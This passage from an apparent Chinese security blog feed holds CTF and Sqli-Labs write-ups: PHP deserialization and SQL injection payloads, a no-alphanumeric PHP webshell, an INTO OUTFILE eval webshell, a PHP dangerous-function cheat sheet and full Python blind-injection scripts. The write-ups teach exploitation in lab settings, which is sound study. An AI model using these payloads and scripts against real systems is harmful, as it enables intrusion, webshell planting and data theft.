!empty($_GET['gen_code']))&#123; $temp = new Object; $temp-&gt;enter=$_GET['gen_code']; $code=base64_encode(serialize($temp)); echo '&lt;center&gt;&lt;font color=\'white\'&gt;Here is your code, please use it to Lott: &lt;strong&gt;'.$code.'&lt;/strong&gt;&lt;/font&gt;&lt;/center&gt;';&#125;?&gt;&lt;center&gt;&lt;font color='white'&gt;-----------------------------------------------------------------------------------------------------------------------------&lt;/font&gt;&lt;h3&gt;&lt;font color='white'&gt;Take code&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;&lt;p&gt;&lt;font color='white'&gt;Pick your six numbers (Ex: 15 02 94 11 88 76)&lt;/font&gt;&lt;p&gt;&lt;form&gt; &lt;input type="text" name="gen_code" maxlength="17" /&gt;&lt;p&gt;&lt;p&gt; &lt;button type="submit" name="btn-submit" value="go"&gt;send&lt;/button&gt;&lt;/form&gt;&lt;/center&gt;&lt;?phpif(isset($_GET['is_debug']) &amp;&amp; $_GET['is_debug']==='1')&#123; show_source(__FILE__);&#125;?&gt;&lt;!-- GET is_debug=1 --&gt;&lt;/body&gt; 看到有unserialize，感觉会考反序列化问题。看到有rand()感觉会考随机数预测问题。看到===，一般不存在弱类型问题。从源码上看，这题需要我们预测留个数字，然后序列化再传入并反序列化，与服务器上随机生成的六个数进行对比，若相同则出flag。这题最后用反序列化的方法解出来了。不过这个反序列化的套路跟以前不太一样。利用下面的php代码：1234567891011&lt;?phpclass Object&#123; var $jackpot; var $enter;&#125;$chybeta = new Object();$chybeta-&gt;enter=&amp;$obj-&gt;jackpot;$code=base64_encode(serialize($chybeta));echo $code; 上述代码，将$jackpot的地址赋给$enter，相当于两个指针指到了同一块内存区域，所以不管做什么变化，这两个变量的变化是同步的。 访问：1http://128.199.190.23:8001/?input=Tzo2OiJPYmplY3QiOjI6e3M6NzoiamFja3BvdCI7TjtzOjU6ImVudGVyIjtSOjI7fQ%3D%3D&amp;btn-submit=go FLAG:1MeePwnCTF&#123;__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___&#125; 这个思路当时我想到了但没去尝试，因为当时想的是传给enter的jackpot地址是我本机上的地址，跟服务器上的不同，然后就死磕在rand（）的预测上。在跟一航大佬讨论后，才知道这个姿势可行。永远不要怀疑自己的脑洞。关于php变量的内存分布之后单独开一篇写。 还有就是对rand（）的预测。这个想法不是不无根据，HITCON CTF 2015 Quals Web Giraffe’s Coffee和0CTF 2016 qual rand2都考到过。ph师傅的安全箱子的秘密和Sjoerd Langkemper的Cracking PHP rand()有谈到这个rand()预测的具体技巧和操作。不过我没成功:) Br0kenMySQL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;&lt;p style='color:Red'&gt;Br0kenMySQL&lt;/p&gt;&lt;?phpif($_GET['debug']=='🕵') die(highlight_file(__FILE__));require 'config.php';$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);if (!$link) &#123; die('Could not connect: ' . mysql_error());&#125;if (!mysqli_select_db($link,MYSQL_USER)) &#123; die('Could not select database: ' . mysql_error());&#125; $id = $_GET['id']; if(preg_match('#sleep|benchmark|floor|rand|count#is',$id)) die('Don\'t hurt me :-('); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'guest')&#123; $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; if(preg_match('#sleep|benchmark|floor|rand|count#is',$ip)) die('Don\'t hurt me :-('); var_dump($ip); if(!empty($ip)) mysqli_query($link,"INSERT INTO logs VALUES('&#123;$ip&#125;')"); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'admin')&#123; echo "What ???????\nLogin as guest&amp;admin at the same time ?\nSeems our code is broken, here is your bounty\n"; die(FLAG); &#125; echo "Nothing here"; &#125; else &#123; echo "Hello ".$username; &#125;?&gt;&lt;/h1&gt;&lt;/pre&gt; 从源码来看，逻辑上我们得先让$username值为guest进入if判断后，再让$username的值为admin，从而echo出flag。而且$id处可注入。做法是找到一个随机串，利用case语句在不同情况下随机取值，结合爆破，拿flag。题目把rand()，floor()等过滤了，不能直接生成随机数。可以利用mysql内置的一些函数或变量，比如时间戳。因此有了下面的payload：1http://139.59.239.133/?id=(SELECT case MOD(UNIX_TIMESTAMP(),3) when 1 then 2 else 1 end;) FLAG:1MeePwnCTF&#123;_b4by_tr1ck_fixed&#125; 除了用UNIX_TIMESTAMP()，其他一些函数/变量也行，比如：123456789101112uuid()UUID_SHORT() // mysql 5.1后有CURRENT_TIMESTAMP()CURRENT_TIMESTAMPCURTIME()localtime()localtimelocaltimestamp()localtimestampnow()sysdate()utc_timestamp() Br0kenMySQL v212345678910111213141516171819202122232425262728293031323334353637383940Br0kenMySQL&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;&lt;p style='color:Red'&gt;Br0kenMySQL&lt;/p&gt;&lt;?phpif($_GET['debug']=='🕵') die(highlight_file(__FILE__));require '../config.php';$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);if (!$link) &#123; die('Could not connect: ' . mysql_error());&#125;if (!mysqli_select_db($link,MYSQL_USER)) &#123; die('Could not select database: ' . mysql_error());&#125; $id = $_GET['id']; if(preg_match('#sleep|benchmark|floor|rand|count|select|from|\(|\)#is',$id)) die('Don\'t hurt me :-('); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'guest')&#123; $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; if(preg_match('#sleep|benchmark|floor|rand|count|select|from|\(|\)#is',$ip)) die('Don\'t hurt me :-('); var_dump($ip); if(!empty($ip)) mysqli_query($link,"INSERT INTO logs VALUES('&#123;$ip&#125;')"); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'admin')&#123; echo "What, again ???????!@#$!@#$!@#$\n"; die(FLAG_2); &#125; echo "Nothing here"; &#125; else &#123; echo "Hello ".$username; &#125;?&gt;&lt;/h1&gt;&lt;/pre&gt; 相比较于第一题，过滤了select，和括号（），所以需要换其他方法。类似前面，需要找到一个随机的方法，使得id的值在某些情况下为1（admin），为2（guest），并且不需要括号。比如对一个“随机”值，对其进行mod 2，得到的结果是0或1，我们只要再加上1，就能得到对应的1或2。几种payload:12341 + CURRENT_TIMESTAMP%21 + localtime%21 + localtimestamp%21 + utc_timestamp%2 当然在发送的时候要进行url编码，+替换为%2b,%替换为%25 1MeePwnCTF&#123;_I_g1ve__uPPPPPPPP&#125; Br0kenMySQL v312345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Br0kenMySQL&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;&lt;p style=&apos;color:Red&apos;&gt;Br0kenMySQL&lt;/p&gt;&lt;?phpif($_GET[&apos;debug&apos;]==&apos;🕵&apos;) die(highlight_file(__FILE__));require &apos;../config.php&apos;;$link = mysqli_connect(&apos;localhost&apos;, MYSQL_USER, MYSQL_PASSWORD);if (!$link) &#123; die(&apos;Could not connect: &apos; . mysql_error());&#125;if (!mysqli_select_db($link,MYSQL_USER)) &#123; die(&apos;Could not select database: &apos; . mysql_error());&#125; $id = $_GET[&apos;id&apos;]; if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$id)) die(&apos;Don\&apos;t hurt me :-(&apos;); $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id); $row = mysqli_fetch_array($query); $username = $row[&apos;username&apos;]; if($username === &apos;guest&apos;)&#123; sleep(5); // wait $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] : $_SERVER[&apos;REMOTE_ADDR&apos;]; if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$ip)) die(&apos;Don\&apos;t hurt me :-(&apos;); var_dump($ip); if(!empty($ip)) mysqli_query($link,&quot;INSERT INTO logs VALUES(&apos;&#123;$ip&#125;&apos;)&quot;); $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id); $row = mysqli_fetch_array($query); $username = $row[&apos;username&apos;]; if($username === &apos;admin&apos;)&#123; echo &quot;What, again ???????!@#$!@#$!@#$\n&quot;; echo &quot;Last one, promise!\n&quot;; die(FLAG_3); &#125; echo &quot;Nothing here&quot;; &#125; else &#123; echo &quot;Hello &quot;.$username; &#125;?&gt;&lt;/h1&gt;&lt;/pre&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[谈一谈php变量的内存分布]]></title>
      <url>%2F2017%2F07%2F16%2F%E8%B0%88%E4%B8%80%E8%B0%88php%E5%8F%98%E9%87%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[一道好玩的webshell题]]></title>
      <url>%2F2017%2F07%2F15%2F%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98%2F</url>
      <content type="text"><![CDATA[过滤了数字和绝大多数字符。题目给了源码：123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpini_set("display_errors", "On");error_reporting(E_ALL | E_STRICT);if(!isset($_GET['c']))&#123; show_source(__FILE__); die();&#125;function rand_string( $length ) &#123; $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; $size = strlen( $chars ); $str = ''; for( $i = 0; $i &lt; $length; $id+ ) &#123; $str .= $chars[ rand( 0, $size - 1 ) ]; &#125; return $str;&#125;$data = $_GET['c'];$black_list = array(' ', '!', '"', '#', '%', '&amp;', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '&lt;', '&gt;', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');foreach ($black_list as $b) &#123; if (stripos($data, $b) !== false)&#123; die("WAF!"); &#125;&#125;$filename=rand_string(0x20).'.php';$folder='uploads/';$full_filename = $folder.$filename;if(file_put_contents($full_filename, '&lt;?php '.$data))&#123; echo "&lt;a href='".$full_filename."'&gt;WebShell&lt;/a&gt;&lt;/br&gt;"; echo "Enjoy your webshell~";&#125;else&#123; echo "Some thing wrong...";&#125; 字母啥的都过略了。参考p神的一些不包含数字和字母的webshell。其思路就是利用字符串ARRAY获取字符A，利用php的特性，从A递增获得A到Z的各个字母。原webshell存在&quot;修改其webshell，如下：1234567891011121314151617181920212223242526272829303132333435&lt;?php$_='';$_[+$_]++;$_=$_.'';$__=$_[+''];$_ = $__;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); 由于+在传送中会被解释为空格，所以需要提前url编码为%2b,然后还需要去掉上面的这个webshell中的空格，换行。最后的payload如下：1http://120.24.215.80:10010/?c=$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]); 这里另外补充一个webshell，解法来自http://www.jianshu.com/p/d23d4b1358f2：1234567891011121314151617181920212223242526&lt;?php$_=[].[];$__='';$_=$_[''];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_; // E$_=++$_;$_=++$_;$__=$_.$__; // GE$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_; // GET var_dump($&#123;'_'.$__&#125;[_]($&#123;'_'.$__&#125;[__])); // $_GET["_"]($_GET["__"]); 其最后的payload为：1http://120.24.215.80:10010/?c=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[php代码审计小总结]]></title>
      <url>%2F2017%2F07%2F14%2Fphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[php代码审计小总结 命令执行php代码执行 eval() assert() preg_replace + ‘/e’ call_user_func() call_user_func_array() create_function array_map() 系统命令执行 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号) ob_start() escapeshellcmd() // 该函数用于过滤 文件上传 move_uploaded_file() getimagesize() //验证文件头只要为GIF89a，就会返回真 文件删除 unlink() session_destroy() 文件包含本地文件包含 require() include() include_once() require_once() 远程文件包含 allow_url_include = on 文件读取读文件 hightlight_file($filename); show_source($filename); print_r(php_strip_whitespace($filename)); print_r(file_get_contents($filename)); readfile($filename); print_r(file($filename)); // var_dump fread(fopen($filename,”r”), $size); include($filename); // 非php代码 include_once($filename); // 非php代码 require($filename); // 非php代码 require_once($filename); // 非php代码 print_r(fread(popen(“cat flag”, “r”), $size)); print_r(fgets(fopen($filename, “r”))); // 读取一行 fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF print_r(fgetcsv(fopen($filename,”r”), $size)); print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记 print_r(fscanf(fopen(“flag”, “r”),”%s”)); print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组 列目录 print_r(glob(“*”)); // 列当前目录 print_r(glob(“/*”)); // 列根目录 print_r(scandir(“.”)); print_r(scandir(“/“)); $d=opendir(&quot;.&quot;);while(false!==($f=readdir($d))){echo&quot;$f\n&quot;;} $d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read())){echo$f.&quot;\n&quot;;} 超全局变量 $GLOBALS 变量覆盖 extract() import_request_variables() parse_str() mb_parse_str() 全局变量覆盖：register_globals为ON，$GLOBALS php序列化函数 serialize() unserialize() ini_set(‘session.serialize_handler’, ‘php_serialize’); Reference 代码审计入门总结 php花式读取文件函数汇总 Awesome-CTF-Book]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less7-writeup]]></title>
      <url>%2F2017%2F07%2F12%2FSqli-Labs-Less7-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less7 是 dump out file 基础知识利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。 load_file()用于读取本地文件内容。有几个条件限制： 需要有读取文件的权限 需要知道文件的绝对物理路径。 假设C盘里有一个TEST.txt文件，内容为chybeta。几种读取方式如下： 直接使用绝对路径注意对路径中斜杠的处理。 mysql&gt; select load_file(“C://TEST.txt”); mysql&gt; select load_file(“C:/TEST.txt”); mysql&gt; select load_file(“C:\TEST.txt”); 以上返回结果如下：123456+---------------------------+| load_file(&quot;C://TEST.txt&quot;) |+---------------------------+| chybeta |+---------------------------+1 row in set (0.00 sec) 但若输入以下查询则会返回空即不成功。 mysql&gt; select load_file(“C:\TEST.txt”);123456+--------------------------+| load_file(&quot;C:\TEST.txt&quot;) |+--------------------------+| NULL |+--------------------------+1 row in set (0.00 sec) 使用编码ASCII以C:\\TEST.txt为例。对其进行ascii编码后利用char（）进行查询：1mysql&gt; select load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)); 返回结果：123456+---------------------------------------------------------+| load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)) |+---------------------------------------------------------+| chybeta |+---------------------------------------------------------+1 row in set (0.02 sec) 十六进制以C:\\TEST.txt为例。对其进行十六进制编码后进行查询：1mysql&gt; select load_file(0x433a5c5c544553542e747874); 返回结果：123456+---------------------------------------+| load_file(0x433a5c5c544553542e747874) |+---------------------------------------+| chybeta |+---------------------------------------+1 row in set (0.00 sec) select可以用来导出文件/数据到文件中。语法如下：1SELECT * INTO OUTFILE &apos;file_name&apos; 或者1SELECT * INTO DUMPFILE &apos;file_name&apos; file_name处一般要指定绝对路径，否则就会导出到mysql的目录下。同时对需导出的目录有可写权限。对file_name，可以有以下几种编码方式，注意对路径分隔符的处理： 数据导出12mysql&gt; select database() into outfile &apos;C:\\phpstudy\\WWW\\test\\1&apos;;Query OK, 1 row affected (0.09 sec) 12mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;Query OK, 1 row affected (0.00 sec) 这里是假设写入到文件1中。在实际测试中，要outfile出的文件不能已经存在，否则会报错。12mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;ERROR 1086 (HY000): File &apos;C:/phpstudy/WWW/test/1&apos; already exists 写入webshelloutfile还可以用来写入webshell。前提是： 需要知道网站的绝对物理路径，这样导出后的webshell可访问 对需导出的目录有可写权限。 12mysql&gt; select &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; into outfile &apos;C:/phpstudy/WWW/test/webshell.php&apos;;Query OK, 1 row affected (0.00 sec) Lees 7payload:1http://localhost:20000/sqllab/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_POST[&quot;chybeta&quot;]) ?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\test\\less7.php&quot; %23]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less5-6-writeup]]></title>
      <url>%2F2017%2F07%2F12%2FSqli-Labs-Less5-6-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less5-6是盲注 Less 5step1访问1http://localhost:20000/sqllab/Less-5/?id=1 页面正常，返回：You are in…… step21http://localhost:20000/sqllab/Less-5/?id=1&apos; 报错。之后的过程要记得闭合单引号。 step3依次访问如下链接：12http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+ 页面返回信息不同。同时试着使用UNION SELECT注入，1http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+ 页面返回 You are in……返回通用页面。故考虑盲注。这里使用推断攻击技术，通过推断一次一位地逐步提取信息。注入 id=1’ AND (condition)后，通过页面返回的信息来判断condition的真假。当condition为真时，会返回包含“You are in……”的正常页面，当condition为假时，返回空页面。 Exp1Condition12Condition Example:SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char num1和num2都是整数，char为单个字符。 (SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1) 会返回查询到结果（即各数据库名称）的第num1行。 SUBSTRING(*,num2,1) 返回查询后结果的第num2个字母。 SUBSTRING(*,num2,1) = a 是布尔表达式，根据其真假，页面会返回不同的信息。 Something 通过类似的方法，可以先获取数据库的数量，再根据数量依次判断。 通过变化num1，num2，char，可以获取到最后的数据。 多查询一位，通过返回的最后一位是否为空格来判断当前所查询字符串是否已经结束。 Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsimport stringdataset = " abcdefghijklmnopqrstuvwxyz_"querydata = "schema_name"querydb = "INFORMATION_SCHEMA"def sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): for k in range(dbNum): i = 1 result = "" while i : for j in dataset: querysql = "AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j recv = sendPayload(querysql) if "You are in" in recv: if j != ' ': result += j i += 1 else: print result i = 0 breakdef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result Exp2Exp1中，是基于字典进行匹配的，效率低下。可以采用二分法来进行优化。大体思路如上跟Exp1相同。 Condition12Condition Example:ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 1 ,1)) &gt; 127 判断当前第一行的第一个字符的asll码值是否大于127。若该条件为真，则将127替换为 191 （即 （127+255）/2），若该条件为假，则将127替换为63（即（-1+127）/2） Something在写二分法盲注时遇到了一些问题，想了一些策略，但不知道是不是最好的。如果有更好的做法，希望留言告知 搜索范围选择（-1，255），这样能包括的字符ASCII值x满足：0≤x≤255。当判断到所查询字符串结尾时，此时mysql对应的不是空格ASCII码32，而是0。假设所查询的第一个字符串长度为10，当查询到字符串尾部后（即第11个字符），下面这条语句是恒假的：12ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 11 ,1)) &gt; 0+ 由于采用了递归二分法。这里用全局变量findBit用来判断当前字符串是否查询结束，若findBit为1，表明已经查完可以直接break跳到下一个查询。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result Less 6Step1 1http://localhost:20000/sqllab/Less-6/?id=1&apos; 无报错 1http://localhost:20000/sqllab/Less-6/?id=1&quot; 页面报错，返回信息： use near ‘“1”” LIMIT 0,1’ at line 1。需要闭合双引号。 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+ 页面返回正常 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+ 返回错误页面（空白） Step2采用盲注。分析同Less5。exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = 'http://localhost:20000/sqllab/Less-6/?id=1" '+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞]]></title>
